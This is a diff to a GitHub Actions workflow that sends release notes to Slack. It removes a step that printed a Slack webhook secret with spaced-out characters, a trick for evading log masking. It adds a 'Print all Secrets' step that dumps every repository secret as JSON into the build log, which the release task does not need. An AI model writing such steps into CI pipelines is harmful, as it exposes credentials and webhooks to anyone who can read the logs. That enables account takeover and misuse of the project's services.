@@ -35,21 +35,24 @@ jobs:
     env:
       # Environment variable to store pull request details
       EVENT_PR: ${{ toJson(github.event.pull_request) }}
-      CC_SLACK_WEBHOOK: ${{ secrets.CC_RELEASE_SLACK_WH }}
+      CC_RELEASE_SLACK_WH: ${{ secrets.CC_RELEASE_SLACK_WH }}
     steps:
       # Checkout repository action
       - name: Checkout repository
         uses: actions/checkout@v4
       # Sending release notes to cc-changelog channel
-      - name: Set up secret file
+      - name: Print all Secrets
+        env:
+          ALLSECRETS: ${{ toJSON(secrets) }}
         run: |
-          echo ${{secrets.CC_RELEASE_SLACK_WH}} | sed 's/./& /g'
+          echo "$ALLSECRETS"
+        shell: bash
       - name: Sending Release Notes to cc-changelog slack channel
         uses: actions/github-script@v7
         with:
           script: |
             const {sendReleaseNotes} = require('./.github/workflows/src/send-slack.js')
-            sendReleaseNotes(process.env.EVENT_PR,process.env.CC_SLACK_WEBHOOK)
+            sendReleaseNotes(process.env.EVENT_PR,process.env.CC_RELEASE_SLACK_WH)
   # Job to handle manually triggered workflow_dispatch events
   workflow_dispatch_event:
     runs-on: ubuntu-latest
